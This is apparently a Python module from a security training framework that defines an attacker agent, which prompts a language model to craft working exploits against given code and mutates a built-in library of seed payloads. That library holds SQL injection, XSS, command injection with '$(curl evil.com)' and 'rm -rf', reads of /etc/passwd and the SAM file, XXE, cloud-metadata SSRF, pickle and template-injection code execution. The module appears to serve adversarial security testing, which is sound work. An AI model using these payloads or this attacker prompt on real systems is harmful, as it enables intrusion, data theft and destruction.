"""
src/sentinel/agents/red_agent.py

Red Agent (Attacker) - Generates exploits and finds vulnerabilities.
"""

import json
import logging
import random
from typing import Dict, Any, List, Optional
from dataclasses import dataclass

from .base_agent import BaseLLMAgent, AgentResponse

logger = logging.getLogger(__name__)


@dataclass
class Attack:
    """Structured attack payload."""
    attack_type: str
    payload: str
    target_function: str
    target_line: Optional[int]
    explanation: str
    confidence: float


class RedAgent(BaseLLMAgent):
    """
    Red Agent (Attacker) - Learns to find vulnerabilities and generate exploits.
    """
    
    def _get_agent_config(self) -> Dict[str, Any]:
        """Get Red Agent specific configuration."""
        return self.config.get('agents', {}).get('red_agent', {})
    
    def __init__(self, config: Dict[str, Any], rag_retriever=None):
        """Initialize Red Agent."""
        super().__init__(config)
        self.rag = rag_retriever
        
        self.attack_types = self.agent_config.get('attack_types', [
            'sql_injection',
            'xss',
            'command_injection',
            'path_traversal',
            'xxe',
            'ssrf',
        ])
        
        self.max_payload_length = self.agent_config.get('max_payload_length', 1000)
        self.mutation_rate = self.agent_config.get('mutation_rate', 0.3)
        
        # Attack pattern library (seed attacks)
        self.attack_patterns = self._load_attack_patterns()
        
        logger.info(f"Red Agent initialized with {len(self.attack_types)} attack types")
    
    def _load_attack_patterns(self) -> Dict[str, List[str]]:
        """Load known attack patterns for mutation."""
        return {
            'sql_injection': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "1'; DROP TABLE users--",
                "admin'--",
                "' OR 1=1#",
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(document.cookie)",
                "<svg/onload=alert(1)>",
            ],
            'command_injection': [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(curl evil.com)",
                "&& rm -rf /tmp/*",
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//etc/passwd",
            ],
            'xxe': [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/'>]>",
            ],
            'ssrf': [
                "http://localhost:22",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::]:80",
            ],
            'deserialization': [
                "cos\nsystem\n(S'id'\ntR.",
                "import pickle,os;pickle.dumps(type('E',(),{'__reduce__':lambda s:(os.system,('id',))})())",
                "__import__('os').system('id')",
            ],
            'nosql_injection': [
                '{"$gt": ""}',
                '{"$ne": ""}',
                '{"$regex": ".*"}',
                '{"$where": "this.password.match(/.*/)"}',
            ],
            'ssti': [
                "{{7*7}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "${7*7}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
            ],
            'idor': [
                "1",
                "2",
                "999",
                "../admin",
            ],
            'open_redirect': [
                "//evil.com",
                "https://evil.com",
                "/\\evil.com",
                "//evil%2Ecom",
            ],
        }
    
    def act(self, observation: Dict[str, Any]) -> AgentResponse:
        """
        Generate an attack based on the code observation.
        
        Args:
            observation: Contains 'code', 'language', 'context'
            
        Returns:
            AgentResponse with attack details
        """
        code = observation.get('code', '')
        language = observation.get('language', 'python')
        context = observation.get('context', '')
        
        # Decide whether to use LLM or mutation
        if random.random() < 0.7:  # 70% LLM, 30% mutation
            attack = self._generate_llm_attack(code, language, context)
        else:
            attack = self._generate_mutation_attack(code)
        
        # Log the attack
        self.add_to_history({
            'action': 'attack',
            'attack_type': attack.attack_type,
            'payload': attack.payload,
            'target': attack.target_function,
        })
        
        return AgentResponse(
            content=json.dumps({
                'attack_type': attack.attack_type,
                'payload': attack.payload,
                'target_function': attack.target_function,
                'target_line': attack.target_line,
            }),
            confidence=attack.confidence,
            reasoning=attack.explanation,
        )
    
    def _generate_llm_attack(self, code: str, language: str, context: str) -> Attack:
        """Generate attack using LLM."""
        
        # Get recent attack history to avoid duplication
        recent_attacks = self.get_recent_history(n=5)
        attack_history = [a.get('attack_type') for a in recent_attacks if 'attack_type' in a]
        
        system_prompt = """You are an expert penetration tester specializing in finding security vulnerabilities in code.

Your goal is to identify exploitable vulnerabilities and generate PRACTICAL, WORKING attack payloads that will actually trigger the vulnerability.

CRITICAL GUIDELINES:
1. Analyze the code to identify the EXACT vulnerable function/parameter
2. Generate payloads that will ACTUALLY WORK in the context of the code
3. For SQL injection: craft payloads that bypass authentication or extract data
4. For command injection: use shell metacharacters (; | & $ `) to execute additional commands
5. For path traversal: use ../ sequences to escape directories
6. For XSS: create payloads that won't be escaped
7. For SSRF: target internal/localhost addresses
8. For XXE: use ENTITY declarations to read files

Focus on these vulnerability types:
- SQL Injection (SQLi): ' OR '1'='1, UNION SELECT, --
- Cross-Site Scripting (XSS): <script>alert(1)</script>, <img src=x onerror=alert(1)>
- Command Injection: ; cat /etc/passwd, | ls -la, `whoami`
- Path Traversal: ../../../etc/passwd, ../../secret.txt
- XML External Entity (XXE): <!ENTITY xxe SYSTEM 'file:///etc/passwd'>
- Server-Side Request Forgery (SSRF): http://localhost:22, http://169.254.169.254

Think like a real attacker and be creative."""

        # Extract vulnerability type from context if provided
        vuln_type = context.split(': ')[1] if ':' in context else 'unknown'
        
        # Get memory context (success tracking)
        memory_context = self.get_memory_context(vuln_type, n=3)
        
        # Get RAG context (intelligence)
        rag_context = ""
        if self.rag:
            rag_context = self.rag.get_attack_context(code, vuln_type)

        user_prompt = f"""Analyze this {language} code for security vulnerabilities and generate a WORKING exploit:

```{language}
{code}
```

Context: {context if context else 'None provided'}

{rag_context}
{memory_context}

Previous attacks tried: {', '.join(attack_history) if attack_history else 'None'}

STEP-BY-STEP ANALYSIS:
1. Identify ALL user-controlled inputs (parameters, variables)
2. Trace how these inputs are used 
3. Find where unsanitized input reaches dangerous functions
4. Craft a payload that exploits this specific weakness

IMPORTANT:
- If you see SQL queries with f-strings or string concatenation → SQL injection
- If you see os.system(), os.popen(), subprocess with shell=True → Command injection
- If you see file paths from user input → Path traversal
- If you see HTML rendering without escaping → XSS
- If you see XML parsing without disabling entities → XXE
- If you see HTTP requests to user-provided URLs → SSRF

Generate a NEW attack that will ACTUALLY TRIGGER the vulnerability.

Respond ONLY with valid JSON:
{{
    "attack_type": "sql_injection|xss|command_injection|path_traversal|xxe|ssrf",
    "payload": "the actual malicious input/payload that will exploit the vulnerability",
    "target_function": "name of the vulnerable function you're targeting",
    "target_line": 12,
    "explanation": "brief explanation: why this payload will bypass security and trigger the vulnerability",
    "confidence": 0.85
}}

Be specific and practical. The payload should be a real attack string, not pseudocode."""

        try:
            response = self._call_llm(user_prompt, system_prompt)
            
            # Parse JSON response
            # Clean up markdown if present
            if '```json' in response:
                response = response.split('```json')[1].split('```')[0]
            elif '```' in response:
                response = response.split('```')[1].split('```')[0]
            
            attack_data = json.loads(response.strip())
            
            # --- SAFE PAYLOAD EXTRACTION ---
            # Ensure payload is a string to prevent slicing errors if None
            raw_payload = attack_data.get('payload', '')
            if raw_payload is None:
                raw_payload = ""
            payload_str = str(raw_payload)
            # -------------------------------
            
            return Attack(
                attack_type=attack_data.get('attack_type', 'unknown'),
                payload=payload_str[:self.max_payload_length],
                target_function=attack_data.get('target_function', ''),
                target_line=attack_data.get('target_line'),
                explanation=attack_data.get('explanation', ''),
                confidence=attack_data.get('confidence', 0.5),
            )
            
        except Exception as e:
            logger.error(f"LLM attack generation failed: {e}")
            # Fallback to mutation
            return self._generate_mutation_attack(code)
    
    def _generate_mutation_attack(self, code: str) -> Attack:
        """Generate attack by mutating known patterns."""
        
        # Pick a random attack type
        attack_type = random.choice(self.attack_types)
        
        # Get base payloads for this type
        base_payloads = self.attack_patterns.get(attack_type, [''])
        
        if not base_payloads:
            return Attack(
                attack_type=attack_type,
                payload='',
                target_function='unknown',
                target_line=None,
                explanation='Failed to generate attack',
                confidence=0.0,
            )
        
        # Pick and potentially mutate a payload
        payload = random.choice(base_payloads)
        
        if random.random() < self.mutation_rate:
            payload = self._mutate_payload(payload, attack_type)
        
        return Attack(
            attack_type=attack_type,
            payload=payload,
            target_function='auto_detected',
            target_line=None,
            explanation=f'Mutation-based {attack_type} attack',
            confidence=0.6,
        )
    
    def _mutate_payload(self, payload: str, attack_type: str) -> str:
        """Apply mutations to a payload."""
        
        mutations = [
            lambda p: p.upper(),  # Case mutation
            lambda p: p.lower(),
            lambda p: p.replace(' ', '%20'),  # URL encoding
            lambda p: p.replace("'", "''"),  # SQL escape mutation
            lambda p: p + '\x00',  # Null byte injection
            lambda p: p.replace('<', '%3C').replace('>', '%3E'),  # HTML encoding
        ]
        
        mutation = random.choice(mutations)
        try:
            return mutation(payload)[:self.max_payload_length]
        except Exception:
            return payload
    
    def analyze_code(self, code: str, language: str = 'python') -> List[Dict[str, Any]]:
        """
        Analyze code to find potential vulnerabilities (without exploiting).
        
        Args:
            code: Source code to analyze
            language: Programming language
            
        Returns:
            List of potential vulnerabilities
        """
        system_prompt = """You are a security auditor. Analyze code for vulnerabilities.

List ALL potential security issues, even if you're not 100% certain.
Be thorough and consider edge cases."""

        user_prompt = f"""Analyze this {language} code for security vulnerabilities:

```{language}
{code}
```

List all potential vulnerabilities you can find.

Respond with valid JSON array:
[
    {{
        "type": "sql_injection",
        "line": 12,
        "severity": "high|medium|low",
        "description": "...",
        "exploitable": true
    }},
    ...
]"""

        try:
            response = self._call_llm(user_prompt, system_prompt)
            
            # Clean and parse JSON
            if '```json' in response:
                response = response.split('```json')[1].split('```')[0]
            elif '```' in response:
                response = response.split('```')[1].split('```')[0]
            
            vulnerabilities = json.loads(response.strip())
            return vulnerabilities if isinstance(vulnerabilities, list) else []
            
        except Exception as e:
            logger.error(f"Code analysis failed: {e}")
            return []
